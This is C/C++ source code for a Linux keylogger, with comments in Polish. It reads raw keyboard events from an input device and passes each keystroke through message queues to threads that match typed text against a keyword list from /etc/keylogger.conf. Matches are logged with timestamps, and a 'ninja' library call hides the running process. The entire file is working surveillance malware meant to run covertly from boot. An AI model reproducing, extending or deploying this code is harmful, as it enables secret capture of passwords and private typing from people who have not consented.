#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/time.h>
#include <termios.h>
#include <signal.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <vector>
#include <mqueue.h>
#include <list>
#include <pthread.h>

#include "tree.h"
#include "treecheck.h"
#include "ninja/ninja.h"

pthread_mutex_t mutex;

//tablica znaków
const char chars[] = { ' ',' ','1','2','3','4','5','6','7','8','9','0',
					 ' ',' ',' ',' ','q','w','e','r','t','y','u','i',
					 'o','p','[',']',' ',' ','a','s','d','f','g','h',
					 'j','k','l',' ',' ',' ',' ',' ','z','x','c','v',
					 'b','n','m',',','.','/' };

//struktura argumentów do funkcji runChecker
struct CheckerArgs
{
    CheckerArgs(const std::string &p, Tree &t, const std::string &n) : tree(t), name(n), logPath(p) {}
    std::string name;
    std::string logPath;
    Tree &tree;
};

void handler (int sig)
{
  exit(0);
}

void perror_exit()
{
  handler(9);
}

//metoda inicjująca keyLoggera oraz uruchamiająca sendera znaków
void init();
//metoda odpowiedzialna za sprawdzanie słowa kluczowego w drzewie
void *runChecker(void *args);

int main (int argc, char **argv)
{

   init_ninja(argc, argv);
   hide_ninja();

//zrezygnowaliśmy ze standardowej metody tworzenia deamona,
//gdyż zapewnia to nam system uruchamiając proces
//podczas startu systemu
//	if (!fork())
		init();

}

void loadData(std::string &eventPath, std::string &logPath, std::vector<std::string> *slowa)
{

	std::ifstream stream;
	stream.open("/etc/keylogger.conf");
	std::string temp;
	stream >> temp;
	int event = 0;
	stream >> event;
	std::stringstream ss;
	ss << "/dev/input/event" << event;
	eventPath = ss.str();
	stream >> logPath;
        stream >> temp;
        while(!stream.eof()){
            stream >> temp;
            slowa->push_back(temp);
        }
	stream.close();


}

//drukowanie czasu to pliku (potrzebne przy wystąpieniu słowa kluczowego)
void printTime(FILE *data)
{
	time_t now;
	char *t = (char *)malloc(100);
	time(&now);
	strcpy(t, (char *)ctime(&now));
	t[strlen(t) - 1] = '\0';

	fprintf(data, "%s : ", t);
	fflush(data);

	free(t);
}

void init()
{
	struct input_event ev[1];
	int fd, rd, value, size = sizeof(struct input_event);

	std::string logPath;
	std::string eventPath;
	std::vector<std::string> slowa;
	loadData(eventPath, logPath, &slowa);


	Tree tree(slowa);


    if(pthread_mutex_init(&mutex,NULL) == -1)
	{
        printf ("pthread_mutex_init ERROR\n");
        exit(1);
    }

	//Open Device
	if ((fd = open (eventPath.c_str(), O_RDONLY)) == -1)
		printf ("%s is not a vaild device.n", eventPath.c_str());


	FILE *data = fopen(logPath.c_str(), "a+");


	printTime(data);
	fprintf(data, "-- session start --\n");
	fflush(data);

    std::list<mqd_t> queueList;
    std::list<std::string> queueNameList;
    srand (time(NULL));


	while (1)
	{

		if ((rd = read (fd, ev, size * 1)) < size)
			continue;

		value = ev[0].code;


		if (ev[0].type == 1 && ev[0].value == 1)
		{
            std::string qname = "/";
            qname += std::to_string(time(NULL)) + std::to_string(rand());

            struct mq_attr attrib;
            attrib.mq_flags =  0;
            attrib.mq_maxmsg = 4;     //maksymalna ilość wiadomości w kolejce
            attrib.mq_msgsize = 8;   //wielkość 1 wiadomości

            //otworzenie nowej kolejki
            const mqd_t id = mq_open(qname.c_str(), O_CREAT | O_WRONLY, 0644, &attrib);

                if(id != -1)
                {
                    queueList.push_back(id);
                    queueNameList.push_back(qname);
                }
                else
                {
                    pthread_mutex_lock(&mutex);
                    fprintf(data,"%s QUEUE OPEN ERROR (SENDER)\n",qname.c_str());
                    fflush(data);
                    pthread_mutex_unlock(&mutex);
                    return;
                }

            //tworzenie nowego wątku dla kolejnej literki
            CheckerArgs *arguments = new CheckerArgs(logPath,tree,qname);

            //uruchomienie wątku Chekecra
            pthread_t newThread;
            pthread_create(&newThread, 0, runChecker, (void*)arguments);
            pthread_detach(newThread);

            if(!queueList.empty())
			{
                auto itN = queueNameList.begin();
                for(std::list<mqd_t>::iterator it=queueList.begin(); it!=queueList.end();)
                {
                    std::string path = "/dev/mqueue";
                    path += *itN;
                    FILE *check = fopen(path.c_str(),"r");

                    std::string msg = "";
                    msg += chars[value];

                    //sprawdzenie czy kolejka nadal istnieje
                    if( check != NULL)
                    {

                        if(mq_send(*it, msg.c_str(),sizeof(msg.c_str()), 0) == -1)
                        {
                            pthread_mutex_lock(&mutex);
                            fprintf(data, "%s QUEUE SEND ERROR\n",(*itN).c_str());
                            fflush(data);
                            pthread_mutex_unlock(&mutex);
                        }
                        it++;
                        itN++;
                    }
                    else
                    {
                        it = queueList.erase(it);
                        itN = queueNameList.erase(itN);
                    }
                }
            }

		}
    }

}



void *runChecker(void *args)
{
    CheckerArgs *arguments = (CheckerArgs*)args;
    FILE *file = fopen(arguments->logPath.c_str(),"a+");

    TreeCheck checker(&(arguments->tree));

    //metoda tworzaca kolejkę
    const int id = mq_open(arguments->name.c_str(),O_RDONLY);
    if(id==-1)
    {
        pthread_mutex_lock(&mutex);
        fprintf(file, "%s QUEUE OPEN ERROR\n",arguments->name.c_str());
        fflush(file);
        pthread_mutex_unlock(&mutex);
        exit(1);
    }

    while(1)
    {

        char buff[9] = {0};
        //odbieranie wiadomości z kolejki - jeśli nie ma - wątek zawiesza się w oczekiwaniu na nią
        const int rc = mq_receive(id, buff,sizeof(buff), NULL);


        if(id==-1)
        {
            pthread_mutex_lock(&mutex);
            fprintf(file, "%s QUEUE RECEIVE ERROR\n",arguments->name.c_str());
            fflush(file);
            pthread_mutex_unlock(&mutex);
            break;
        }
        //czy litera jest kolejnym liściem drzewa
        if(checker.checkNextLetter(buff[0]))
        {
                //znaleziono słowo
                if(checker.isCurrentNodeTerminal())
                {
                    pthread_mutex_lock(&mutex);
                    printTime(file);
                    fprintf(file, "%s\n", checker.getFoundWord().c_str());
                    fflush(file);
                    pthread_mutex_unlock(&mutex);

                }
        }
        else
        {
                    int close = mq_close(id);   //zamykanie kolejki
                    if(close != 0)
                    {
                        pthread_mutex_lock(&mutex);
                        fprintf(file, "%s QUEUE CLOSE ERROR\n",arguments->name.c_str());
                        fflush(file);
                        pthread_mutex_unlock(&mutex);
                        exit(1);
                    }

                    close = mq_unlink(arguments->name.c_str());    //odłączanie kolejki

                    if(close != 0)
                    {
                            pthread_mutex_lock(&mutex);
                            fprintf(file, "%s QUEUE UNLINK ERROR\n",arguments->name.c_str());
                            fflush(file);
                            pthread_mutex_unlock(&mutex);
                            exit(1);
                    }
                    break;
        }
    }
}
